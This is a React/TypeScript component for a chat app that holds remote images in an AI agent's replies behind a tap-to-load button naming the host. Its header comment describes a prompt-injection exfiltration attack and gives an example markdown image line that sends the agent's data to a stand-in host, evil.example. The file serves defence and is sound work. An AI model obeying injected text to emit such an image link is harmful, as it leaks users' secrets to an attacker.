/**
 * An image in a reply that lives on someone else's server.
 *
 * Loading it is a request the *model* chose, sent from the phone the moment
 * the reply renders. That is the exfiltration channel prompt injection
 * reaches for: a web page or file the agent read tells it to write
 * `![](https://evil.example/?d=<whatever it just saw>)`, and the image fetch
 * delivers the secret with no tap from anyone. So a remote image waits behind
 * a button that names the host, and the request happens only when you ask.
 *
 * Deliberately per image, not per host. "Always load from this host" would
 * turn one tap on an innocent-looking picture into a standing permission
 * every later URL on that host could carry data through. What *is* remembered
 * is the exact URL once tapped: fetching it again leaks nothing the first
 * request didn't, and it keeps a picture you opened from reverting to a
 * button when the streaming bubble hands over to the finished message.
 *
 * Same-origin images are untouched (they go to the proxy, which already has
 * everything), as are the agent's own files — see `LocalImage`.
 */
import { useState } from 'react';

/**
 * The host to name if `src` would be fetched from another origin, else null.
 *
 * Resolved against the page, so a relative or protocol-relative source is
 * judged by where the browser would actually send it. Only http(s) counts:
 * `data:` and `blob:` carry their bytes with them and make no request.
 */
export function remoteImageHost(src: string, pageOrigin: string = window.location.origin): string | null {
  let url: URL;
  try {
    url = new URL(src, pageOrigin);
  } catch {
    // Unparseable here means unparseable to the browser too: no request.
    return null;
  }
  if (url.protocol !== 'http:' && url.protocol !== 'https:') return null;
  if (url.origin === pageOrigin) return null;
  // `host` is punycode for an IDN, which is the honest spelling to show —
  // a lookalike Unicode name would defeat the point of naming it.
  return url.host;
}

/** Exact URLs already loaded with consent this page-load. */
const allowed = new Set<string>();

export function RemoteImage({ src, host, alt }: { src: string; host: string; alt?: string }) {
  const [shown, setShown] = useState(() => allowed.has(src));
  const label = alt?.trim();

  if (!shown) {
    return (
      <button
        type="button"
        className="chat-image chat-image--remote"
        aria-label={`Load image from ${host}${label ? `: ${label}` : ''}`}
        // The full URL on hover, so a desktop user can see the query string
        // before agreeing to send it.
        title={src}
        onClick={() => {
          allowed.add(src);
          setShown(true);
        }}
      >
        Image from <strong>{host}</strong> — tap to load
      </button>
    );
  }

  // No referrer either. The default policy still sends the proxy's origin —
  // often a private tailnet hostname — which is no business of the image host.
  return <img className="chat-image" src={src} alt={alt ?? ''} referrerPolicy="no-referrer" />;
}
